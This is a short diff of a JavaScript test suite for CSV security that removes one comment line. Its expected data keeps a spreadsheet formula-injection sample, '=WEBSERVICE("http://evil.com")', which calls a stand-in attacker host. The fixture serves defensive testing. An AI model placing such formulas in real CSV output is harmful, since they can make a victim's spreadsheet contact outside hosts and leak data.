@@ -340,7 +340,6 @@ describe('csvSecurity', () => {
         ),
       );
 
-      // Verify the data is properly restored
       expect(cleanedData).toEqual([
         ['Name', 'Formula', 'Phone'],
         ['John Doe', '=WEBSERVICE("http://evil.com")', '+1-555-123-4567'],
